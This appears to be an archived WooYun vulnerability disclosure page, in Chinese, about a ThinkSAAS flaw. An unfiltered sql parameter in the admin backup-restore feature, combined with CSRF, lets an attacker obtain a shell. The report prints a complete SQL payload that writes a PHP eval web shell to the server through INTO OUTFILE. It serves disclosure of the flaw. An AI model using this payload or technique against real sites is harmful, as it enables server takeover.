@@ -1,0 +1,194 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ThinkSAAS某功能设计不当可能导致可以csrf后台GETSHELL  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ThinkSAAS某功能设计不当可能导致可以csrf后台GETSHELL  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/xfkxfk">xfkxfk</a> 
+</li><li>提交时间：		2013-12-10 19:04</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-15：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-03-07：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">ThinkSAAS某处处存在任意文件操作，利用CSRF直接前台导致GETSHELL</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">首先这里存在问题的是后台系统管理的数据备份还原处。<br />
+<br />
+</p><p class="detail"><a href="../images/101900095511d03acbbd40b5acc82525be0f3025.png" target="_blank"><img src="../images/101900095511d03acbbd40b5acc82525be0f3025.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+这里没有过滤sql参数，直接带入，拼接data/baksql/目录，然后进入恢复数据<br />
+<br />
+</p><p class="detail"><a href="../images/10190019a19ade4b51848cfd935f6064d7f4829b.png" target="_blank"><img src="../images/10190019a19ade4b51848cfd935f6064d7f4829b.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+这里在恢复是判断有没有分卷，没有分卷就直接恢复了，没有处理所要备份的sql文件的路径，类型，内容等，导致操作任意文件。<br />
+<br />
+然后来看看这里数据恢复的操作：<br />
+<br />
+</p><p class="detail"><a href="../images/10190026ad515682fc5526a31577c12bc2155a69.png" target="_blank"><img src="../images/10190026ad515682fc5526a31577c12bc2155a69.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+我们抓个包：<br />
+<br />
+</p><p class="detail"><a href="../images/101900376d5e286a9d4cc8835476071d73e6e17e.png" target="_blank"><img src="../images/101900376d5e286a9d4cc8835476071d73e6e17e.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+我们在前台上传一个图片，图片内容为：<br />
+<br />
+Drop TABLE IF EXISTS temp;<br />
+<br />
+Create TABLE temp(cmd text NOT NULL);<br />
+<br />
+Insert INTO temp (cmd) VALUES(&quot;&lt;?php @eval($_POST[&#039;cmd&#039;]);?&gt;&quot;);<br />
+<br />
+Select cmd from temp into outfile &#039;F:/thinksaas/eval.php&#039;;<br />
+<br />
+Drop TABLE IF EXISTS temp;<br />
+<br />
+在sql参数处，把sql文件内容替换为我们自己上传的文件即可。<br />
+<br />
+而且最重要的是，这里是GET请求，而且存在CSRF漏洞（图中以证明），那么我们上传了恶意文件后，诱使管理访问我们提供的恶意url就能拿到shell。<br />
+<br />
+</p><p class="detail"><a href="../images/10190054ee0d04a4918f965eaf1d98a39abb939c.png" target="_blank"><img src="../images/10190054ee0d04a4918f965eaf1d98a39abb939c.png" alt="5.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们懂得 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/xfkxfk" title="xfkxfk">xfkxfk</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-045531" title="ThinkSAAS某功能设计不当可能导致可以csrf后台GETSHELL">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-12-15 19:05</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="45531";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
